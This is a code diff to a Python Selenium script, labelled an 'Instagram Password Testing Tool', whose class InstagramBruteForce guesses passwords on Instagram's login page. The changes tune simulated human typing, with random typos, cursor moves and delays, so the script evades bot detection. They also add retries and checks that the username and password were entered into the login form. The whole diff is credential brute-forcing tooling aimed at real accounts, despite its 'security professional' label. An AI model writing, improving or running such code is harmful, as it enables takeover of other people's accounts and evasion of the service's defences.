@@ -1,6 +1,6 @@
 """
 Instagram Password Testing Tool
-Version: 2.0
+Version: 2.1
 Author: Security Professional
 Description: Advanced tool for testing password strength against Instagram accounts
 """
@@ -126,14 +126,20 @@ class InstagramBruteForce:
             delay_range: Min/max delay between keystrokes
         """
         try:
-            # Sometimes focus the field first
-            if random.random() > 0.7:
+            # Clear the field first
+            element.click()
+            time.sleep(random.uniform(0.2, 0.5))
+            element.clear()
+            time.sleep(random.uniform(0.1, 0.3))
+            
+            # Sometimes click again to ensure focus
+            if random.random() > 0.5:
                 element.click()
-                time.sleep(random.uniform(0.2, 0.5))
+                time.sleep(random.uniform(0.1, 0.3))
             
             for i, char in enumerate(text):
-                # Occasionally make a typo and correct it
-                if random.random() > 0.95:
+                # Occasionally make a typo and correct it (but less frequently)
+                if random.random() > 0.98:  # Reduced from 0.95 to make errors rarer
                     wrong_char = random.choice('abcdefghijklmnopqrstuvwxyz1234567890')
                     element.send_keys(wrong_char)
                     time.sleep(random.uniform(*delay_range))
@@ -151,8 +157,8 @@ class InstagramBruteForce:
                 
                 time.sleep(delay)
                 
-                # Sometimes move cursor randomly
-                if random.random() > 0.9:
+                # Sometimes move cursor randomly (but less frequently)
+                if random.random() > 0.95:  # Reduced from 0.9 to make cursor movements rarer
                     actions = ActionChains(self.driver)
                     if random.random() > 0.5:
                         actions.send_keys(Keys.ARROW_LEFT).perform()
@@ -252,20 +258,40 @@ class InstagramBruteForce:
             # Handle cookies if present
             self.handle_cookies()
             
-            # Enter username
-            username_field = WebDriverWait(self.driver, 10).until(
-                EC.presence_of_element_located((By.NAME, "username"))
-            )
-            username_field.clear()
-            self.human_type(username_field, self.config['username'])
+            # Enter username (with retry if needed)
+            for _ in range(2):  # Try twice if first attempt fails
+                username_field = WebDriverWait(self.driver, 10).until(
+                    EC.presence_of_element_located((By.NAME, "username"))
+                )
+                username_field.clear()
+                self.human_type(username_field, self.config['username'])
+                
+                # Verify the username was entered correctly
+                if username_field.get_attribute('value') == self.config['username']:
+                    break
+                else:
+                    logging.warning("Username not entered correctly, retrying...")
+                    username_field.clear()
+                    time.sleep(1)
+            
             time.sleep(random.uniform(0.5, 1.5))
             
-            # Enter password
-            password_field = WebDriverWait(self.driver, 10).until(
-                EC.presence_of_element_located((By.NAME, "password"))
-            )
-            password_field.clear()
-            self.human_type(password_field, password)
+            # Enter password (with retry if needed)
+            for _ in range(2):  # Try twice if first attempt fails
+                password_field = WebDriverWait(self.driver, 10).until(
+                    EC.presence_of_element_located((By.NAME, "password"))
+                )
+                password_field.clear()
+                self.human_type(password_field, password)
+                
+                # Verify the password was entered correctly
+                if password_field.get_attribute('value') == password:
+                    break
+                else:
+                    logging.warning("Password not entered correctly, retrying...")
+                    password_field.clear()
+                    time.sleep(1)
+            
             time.sleep(random.uniform(0.5, 1.5))
             
             # Click login button
